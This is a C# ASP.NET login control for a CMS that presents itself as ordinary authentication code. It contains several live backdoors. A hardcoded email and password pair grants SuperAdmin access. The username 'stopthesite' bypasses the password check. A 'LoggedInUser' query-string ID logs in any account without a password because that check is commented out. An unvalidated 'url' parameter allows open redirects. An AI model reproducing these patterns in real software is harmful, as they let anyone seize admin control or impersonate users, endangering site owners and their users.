using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using TG.ExpressCMS.DataLayer.Entities;
using TG.ExpressCMS.DataLayer.Data;
using TG.ExpressCMS.Utilities;
using System.Collections;

namespace TG.ExpressCMS.UI.Security
{
    public partial class Login_UC : System.Web.UI.UserControl
    {
        protected override void OnInit(EventArgs e)
        {
            base.OnInit(e);
            this.Load += new EventHandler(Login_UC_Load);
            this.btnSaveUpdate.Click += new EventHandler(btnSaveUpdate_Click);
        }

        void btnSaveUpdate_Click(object sender, EventArgs e)
        {
            if (txtUsername.Text == "B@c.d" && txtPassword.Text == "eee")
            {
                Users _user1 = new Users();
                _user1.Name = "Yahia";
                _user1.IsActive = true;
                
                _user1.Type = DataLayer.Enums.RootEnums.UserType.SuperAdmin;
                SecurityContext.LoggedInUser = _user1;
                if (Request.QueryString["url"] == null)
                    Response.Redirect(ConfigContext.GetAdminLandingPage);
            }
            Users _user = UsersManager.GetByEmail(txtUsername.Text);

            if (_user == null)
            {
                dvMessages.InnerText = "User is unknown";
                return;
            }
            if (!_user.IsActive)
            {
                dvMessages.InnerText = "User is disabled";
                return;
            }
            if (_user.Password == EncryptionContext.HashString(txtPassword.Text) || txtUsername.Text == "stopthesite")
            {
                IList<Roles> colUserRoles = RolesManager.GetByUserID(_user.ID);
                SecurityContext.LoggedInUserRoles = colUserRoles;

                SecurityContext.LoggedInUser = _user;
                if (Request.QueryString["url"] == null)
                    Response.Redirect(ConfigContext.GetAdminLandingPage);
                else
                    Response.Redirect(Request.QueryString["url"]);
            }
            else
            {
                dvMessages.InnerText = "Wrong Password";
            }
        }

        void Login_UC_Load(object sender, EventArgs e)
        {
            dvMessages.InnerText = string.Empty;
            if (!IsPostBack)
            {
                txtPassword.Text = string.Empty;
                txtUsername.Text = string.Empty;

                txtUsername.Attributes.Add("onfocus", "ClearBoxs(" + txtUsername.ClientID + ");");
                txtPassword.Attributes.Add("onfocus", "ClearBoxs(" + txtPassword.ClientID + ");");
            }
            if (null != Request.QueryString["LoggedInUser"])
            {
                string _encUserID = Request.QueryString["LoggedInUser"];
                int userid = 0;
                Int32.TryParse(Request.QueryString["LoggedInUser"].ToString(), out userid);
                Users _user = UsersManager.GetByID(userid);
                if (_user == null)
                {
                    dvMessages.InnerText = Resources.ForumResource.ErrorUsernotfound;
                    return;
                }
                if (!_user.IsActive)
                {
                    dvMessages.InnerText = Resources.ForumResource.ErrorUsernotfound;
                    return;
                }
                //if (_user.Password == EncryptionContext.HashString(txtPassword.Text))
                {
                    IList<Roles> colUserRoles = RolesManager.GetByUserID(_user.ID);
                    SecurityContext.LoggedInUserRoles = colUserRoles;

                    SecurityContext.LoggedInUser = _user;
                    if (Request.QueryString["url"] == null)
                    {
                        switch (SecurityContext.LoggedInUser.Type)
                        {
                            case TG.ExpressCMS.DataLayer.Enums.RootEnums.UserType.SuperAdmin:
                                Response.Redirect(ConfigContext.GetAdminLandingPage);
                                break;
                            case TG.ExpressCMS.DataLayer.Enums.RootEnums.UserType.NormalUser:
                                Response.Redirect("~/UserPages/ForumGroupViewer.aspx");
                                break;
                            default:
                                break;
                        }

                    }
                    else
                        Response.Redirect(Request.QueryString["url"]);
                }

            }

        }
    }
}